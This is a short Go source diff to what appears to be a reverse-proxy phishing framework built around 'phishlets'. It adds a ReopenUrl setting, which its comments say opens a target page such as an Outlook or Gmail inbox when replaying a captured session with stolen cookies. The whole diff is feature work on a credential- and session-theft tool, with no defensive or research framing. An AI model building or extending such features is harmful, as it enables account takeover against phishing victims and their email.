@@ -112,6 +112,7 @@ type Phishlet struct {
 	Author           string
 	Version          PhishletVersion
 	RedirectUrl      string
+	ReopenUrl        string // URL to open when replaying the session with cookies
 	minVersion       string
 	proxyHosts       []ProxyHost
 	domains          []string
@@ -253,6 +254,7 @@ type ConfigPhishlet struct {
 	Intercept   *[]ConfigIntercept  `mapstructure:"intercept"`
 	RewriteUrls *[]ConfigRewriteUrl `mapstructure:"rewrite_urls"`
 	BgJA4Allow  []string            `mapstructure:"bg_ja4_allow"`
+	ReopenUrl   string              `mapstructure:"reopen_url"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -567,6 +569,9 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			log.Info("phishlet %s: %d botguard JA4 exception(s)", p.Name, len(p.bgJA4Allow))
 		}
 	}
+	// URL to open when replaying a captured session with cookies
+	// (e.g. the Outlook mailbox for ms365, Gmail inbox for google)
+	p.ReopenUrl = strings.TrimSpace(fp.ReopenUrl)
 	for _, at := range *fp.AuthTokens {
 		ttype := "cookie"
 		if at.Type != nil {
